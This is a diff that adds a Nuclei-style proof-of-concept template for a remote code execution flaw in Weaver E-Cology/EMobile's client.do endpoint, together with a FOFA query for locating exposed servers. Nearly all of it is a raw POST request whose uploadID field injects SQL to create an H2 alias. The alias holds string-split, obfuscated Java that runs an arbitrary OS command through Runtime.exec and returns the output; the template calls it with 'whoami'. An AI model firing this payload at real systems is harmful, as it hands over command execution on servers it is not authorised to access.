@@ -1,0 +1,118 @@
+id: poc-mgau0bdylocrw8pu
+info:
+  name: 泛微E-Cology client.do RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgau0bdylocrw8pu'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mgau0bdylocrw8pu
+    fofa: app="泛微-EMobile"
+http:
+- raw:
+  - 'POST /client.do HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+
+    Content-Length: 0
+
+
+    Cookie: JSESSIONID=abcZRb929ZuHEdfjFEAMy
+
+
+    Content-Type: multipart/form-data; boundary=----HJGJjgvfIUGVYHVvfytfvkgvuy
+
+
+    Content-Length: 1151
+
+
+
+
+    ------HJGJjgvfIUGVYHVvfytfvkgvuy
+
+
+    Content-Disposition: form-data; name="method"
+
+
+
+
+    getupload
+
+
+    ------HJGJjgvfIUGVYHVvfytfvkgvuy
+
+
+    Content-Disposition: form-data; name="uploadID"
+
+
+
+
+    1'';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT(''void e(String cmd) throws
+
+
+    java.la'',''ng.Exception{'',''Object curren'',''tRequest =
+
+
+    Thre'',''ad.currentT'',''hread().getConte'',''xtClass'',''Loader().loadC'',''lass("com.caucho.ser
+
+
+    ver.dispatch.ServletInvocation").getMet'',''hod("getContextRequest").inv'',''oke(null);java
+
+
+    .la'',''ng.reflect.Field _responseF =
+
+
+    currentRequest.getCl'',''ass().getSuperc'',''lass().getDeclar'',''edField("_response");_respo
+
+
+    nseF.setAcce'',''ssible(true);Object response =
+
+
+    _responseF.get(currentRequest);java.la'',''ng.reflect.Method getWriterM =
+
+
+    response.getCl'',''ass().getMethod("getWriter");java.i'',''o.Writer writer =
+
+
+    (java.i'',''o.Writer)getWriterM.inv'',''oke(response);java.ut'',''il.Scan'',''ner scan'',''ner =
+
+
+    (new
+
+
+    java.util.Scann'',''er(Runt'',''ime.getRunt'',''ime().ex'',''ec(cmd).getInput'',''Stream())).useD
+
+
+    elimiter("\\A");writer.write(scan'',''ner.hasNext()?sca'',''nner.next():"");}'');CALL
+
+
+    MzSNqKsZTagmf(''whoami'');--
+
+
+    ------HJGJjgvfIUGVYHVvfytfvkgvuy--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    system
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
